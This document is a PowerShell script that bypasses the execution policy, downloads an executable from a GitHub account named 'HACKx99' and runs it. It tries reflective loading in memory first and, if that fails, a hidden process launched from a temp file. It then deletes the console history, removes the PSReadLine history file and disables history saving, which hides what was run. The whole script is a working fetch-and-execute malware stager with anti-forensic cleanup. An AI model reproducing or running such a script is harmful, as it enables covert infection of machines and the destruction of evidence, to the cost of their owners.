# PowerShell Script to Download and Run EXE in Memory
# WARNING: This script requires Administrator privileges.
# Running unknown EXEs can be dangerous - use at your own risk!

try {
    # Bypass execution policy for CurrentUser
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Define URL
    $exeUrl = "https://raw.githubusercontent.com/HACKx99/WebSite/main/K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    Write-Output "Downloading EXE into memory..."
    
    # Download EXE as byte array directly into memory
    $webClient = New-Object System.Net.WebClient
    $exeBytes = $webClient.DownloadData($exeUrl)
    $webClient.Dispose()

    if ($exeBytes.Length -eq 0) {
        throw "Download failed - no data received"
    }

    Write-Output "EXE downloaded successfully ($($exeBytes.Length) bytes)"

    # Method 1: Load and execute assembly in memory
    try {
        Write-Output "Attempting to load and run EXE in memory..."
        $assembly = [System.Reflection.Assembly]::Load($exeBytes)
        $entryPoint = $assembly.EntryPoint
        
        if ($entryPoint) {
            Write-Output "Found entry point: $($entryPoint.Name)"
            $entryPoint.Invoke($null, $null)
        } else {
            throw "No entry point found in assembly"
        }
    }
    catch {
        Write-Warning "Assembly load method failed: $($_.Exception.Message)"
        
        # Method 2: Save temporarily to temp folder and execute
        Write-Output "Trying temporary file method..."
        $tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + ".exe")
        
        try {
            [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
            
            if (Test-Path $tempPath) {
                Write-Output "Running EXE from temporary location..."
                $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru -Wait
                Write-Output "EXE execution completed"
                
                # Clean up temporary file
                Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
                Write-Output "Temporary file cleaned up"
            }
        }
        catch {
            Write-Warning "Temporary file method failed: $($_.Exception.Message)"
            
            # Method 3: Use Invoke-Expression with base64 (for .NET assemblies)
            Write-Output "Trying base64 execution method..."
            $base64String = [Convert]::ToBase64String($exeBytes)
            $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64String))
            $entryPoint = $assembly.EntryPoint
            $entryPoint.Invoke($null, $null)
        }
    }

    # Forcefully clear PowerShell history
    Write-Output "Cleaning up history..."
    Clear-History -ErrorAction SilentlyContinue
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
        Write-Output "History file removed"
    }
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue

    Write-Output "Script executed successfully. EXE run in memory. History cleared."

} catch {
    Write-Error "Error: $($_.Exception.Message)"
    exit 1
} finally {
    exit 0
}
